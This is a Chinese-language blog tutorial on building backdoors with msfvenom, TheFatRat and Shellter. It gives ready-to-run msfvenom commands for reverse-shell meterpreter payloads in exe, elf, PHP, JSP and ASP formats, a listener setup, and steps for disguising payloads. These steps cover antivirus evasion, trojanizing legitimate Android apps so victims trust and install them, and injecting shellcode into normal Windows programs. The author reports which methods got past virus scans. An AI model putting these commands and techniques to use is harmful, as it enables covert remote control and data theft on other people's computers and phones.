---
title: Metasploit学习2-后门制作
date: 2018-04-15 20:15:19
categories: 安全
tags: [Metasploit,工具]
---

介绍下几个后门制作工具的使用，主要包括msfvenom，thefatrat(推荐)，shellter。

### msfvenom

msfvenom是msf框架中用来生成后门的工具。

<!--more-->

查看命令

```shell
➜  ~ msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message

```



其中常用的几个参数

-l 显示模块列表。例如payloads, encoders
-p 选择需要使用的payload 
-a 选择目标架构
-e 编码方式
-i 指定payload的编码次数
-f 生成的文件格式
-o 保存生成的文件

常用的后门生成命令：

windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=8081 -f exe > shell.exe
```

LINUX

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=8081 -f elf > shell.elf
```

PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=8081 -f raw > shell.php 
```

JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=8081 -f raw > shell.jsp
```

ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=8081 -f asp > shell.asp
```

这里LHOST为本地监听IP，LPORT为监听端口。



### TheFatRat

[TheFatRat](https://github.com/Screetsec/TheFatRat)是同样是一款生成后门的工具，操作简单，功能强大，非常值得推荐使用。

安装

```
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh
```

使用

安装完成后会在桌面出现图标，直接点击即可使用，或者在命令行输入fatrat启动，启动时会进行配置检查，
打开后如图所示，按照功能输入数字即可。

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-5-1/84514103.jpg)



如图，1为使用msfvenom制作后门，2、3、4、6为制作免杀windows后门，5制作安卓后门，7制作office后门，8为debian木马，9导入/创建自动监听，10跳转到msfconsole，11SearchSploit工具，13设置默认监听IP和端口。

生成windows免杀后门方式，选择选项6，再选择1，然后输入ip，端口和payload等信息。

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-5-10/15237360.jpg)

然后会生成一个bat后门文件，将生成的后门放到windows中运行即可。

监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.101.1
set LPORT 8081
run
```

PS：在windows10上测试，使用各种方式生成的后门基本上都不能免杀，或者是不起作用。



### Android隐蔽后门

使用msfvenom生成的android后门一般只有一个图标，但是不具有欺骗性，在实际中很难让人放心安装，这里可以使用对普通应用加后门的方式达到隐蔽效果。使用TheFatRat可以生成隐蔽式的后门。

使用fatrat生成后门方法

1.打开fatrat后选择选项5 `Backdooring Original apk [Instagram, Line,etc] `

2.在新打开的终端中输入ip，端口和app的路径，这里已re文件管理器为例，然后选择payload和生成方式，如图:

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-5-6/31430265.jpg)



成功生成后门后，在小米手机上安装时病毒扫描通过，并且可以正常运行，然后使msfconsole进行监听即可。

但是由于miui系统的权限管理，所以很多操作都需要授权，例如读取联系人短信等，否则msf是无法获取信息。另外需要注意的是并不是所有的app都可以成功。



### shellter

[Shellter](https://www.shellterproject.com/)是一款动态shellcode注入工具。可以将后门shell注入到正常程序中。

安装

在kali linux下可以直接通过源安装`apt-get install shellter`

使用	

在终端下输入shellter，会打开一个新的终端，输入选项A，代表自动模式，然后输入exe文件路径，如图

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-5-8/20824279.jpg)

等待一会，会询问`Enable Stealth Mode?`是否开启隐身模式，即免杀，输入Y，然后选择payload，再输入IP和端口等信息。

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-5-8/36196831.jpg)

然后就会自动生成后门程序。在windows10上测试，可以免杀，但是会弹框要求上传可疑文件进行分析，而且smartscreen筛选器会阻止运行，需要手动点击运行才可以。





参考:
[使用msfvenom生成木马用于监听别人的操作](https://blog.csdn.net/lijia111111/article/details/64124693)



